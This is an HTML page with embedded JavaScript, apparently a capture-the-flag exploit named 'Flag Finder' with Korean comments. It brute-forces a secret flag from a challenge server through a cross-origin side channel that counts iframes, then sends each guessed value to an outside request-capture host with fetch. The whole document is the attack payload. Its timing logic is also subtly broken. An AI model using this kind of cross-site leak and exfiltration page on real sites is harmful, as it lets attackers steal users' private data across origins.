<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Finder</title>
</head>
<body>
    <h1>Flag Finderㅇㅇ</h1>
    <script>
        let server_flag = ''; // 전역 변수
        let previousGoblinCount = 0; // 이전 goblin iframe 개수

        const checkFlag = async () => {
            for (let i = 32; i <= 127; i++) {
                const flag = server_flag + String.fromCharCode(i);
                const requestUrl = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(flag)}`;

                // iframe 생성
                const iframe = document.createElement('iframe');
                iframe.src = requestUrl;
                document.body.appendChild(iframe);

                // goblin iframe 개수 체크
                setTimeout(() => {
                    const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
                    const currentGoblinCount = goblinIframes.length;

                    if (currentGoblinCount > previousGoblinCount) {
                        // goblin iframe이 증가했으면, 다음 문자로 넘어감
                        previousGoblinCount = currentGoblinCount;
                    } else {
                        // goblin iframe이 증가하지 않았다면
                        console.log(`Found flag character: ${flag}`);
                        const finalRequestUrl = `https://xlduugj.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
                        fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
                    }
                }, 100); // 100ms 후에 체크 (서버 응답을 기다리기 위함)
            }
        };

        checkFlag();
    </script>
</body>
</html>
